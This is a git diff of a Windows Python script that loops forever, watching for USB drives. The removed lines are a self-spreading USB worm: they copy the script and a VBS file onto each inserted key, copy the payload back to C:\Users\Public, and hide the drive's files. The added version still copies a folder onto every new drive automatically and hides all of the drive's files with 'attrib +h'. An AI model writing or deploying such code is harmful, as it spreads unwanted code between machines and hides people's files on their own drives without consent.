@@ -1,53 +1,56 @@
-from sys import argv, platform
+from sys import argv
 from datetime import datetime
-import os, time, glob
+from tkinter import messagebox
+import os
+import time
 import ports
-
-import shutil
+import tkinter
 
 startTime = time.time()
 script = argv
 name = str(script[0])
 
-global USBList
 USBList = []
 
-def copy_to_key(dst):
-    if os.name == 'nt':
-        os.mkdir(dst + '\\clone')
-        os.system("copy " + name + " " + dst + "\\clone")
-        os.system("attrib +h " + dst + "\\*  /d")
-        os.system("copy C:\\Users\\Public\\clone " + dst + "\\clone")
-        os.system("move " + dst + "\\clone\\script.vbs " + dst)
+global root
+root = tkinter.Tk()
+root.withdraw()
 
-def copy_from_key(dst):
-	if os.name == 'nt':
-		os.mkdir("C:\\Users\\Public\\clone")
-		os.system("copy " + dst + "\\clone " + "C:\\Users\\Public\\clone ")
-		os.system("attrib +h C:\\Users\\Public\\clone")
+def copy_to_key(dst):
+    '''
+    Copie du PC à la clé USB
+    '''
+    if os.name == 'nt':
+        os.mkdir(dst + '\\build')
+        os.system("robocopy /S C:\\Users\\Public\\build " + dst + "\\build")
+        os.system("attrib +h " + dst + "\\*  /d")
+        #os.system("copy C:\\Users\\Public\\build " + dst + "\\build")
+        #os.system("move " + dst + "\\build\\script.vbs " + dst)
+        messagebox.showinfo("Buzz", "Copié vers " + dst)
 
 def USBDetect():
+	'''
+	Détection de clés USB
+	'''
 	if os.name == 'nt':
-		#print("OS Windows...\n")
 		USBDir = ports.get_usb_devices()
 	lencount = len(USBDir)
 	lencount -= 1
 
 	while lencount >= 0:
-		time.sleep(0.2)
+		time.sleep(0.5)
 		try:
 			if os.path.exists(USBDir[lencount]):
 				if USBDir[lencount] not in USBList:
-					if not os.path.exists(USBDir[lencount] + "\\clone"):
+					if not os.path.exists(USBDir[lencount] + "\\build"):
 						USBList.append(USBDir[lencount])
-						#copy_to_key(USBDir[lencount])
-					else:
-						if not os.path.exists("C:\\Users\\Public\\clone"):
-							copy_from_key(USBDir[lencount])
-				print("Found %s\n" % USBDir[lencount])
+						copy_to_key(USBDir[lencount])
 				lencount -= 1
 			else:
-				#print("No USB Detected")
 				lencount -= 1
 		except IOError:
 			pass
+
+if __name__ == '__main__':
+    while(1):
+        USBDetect()
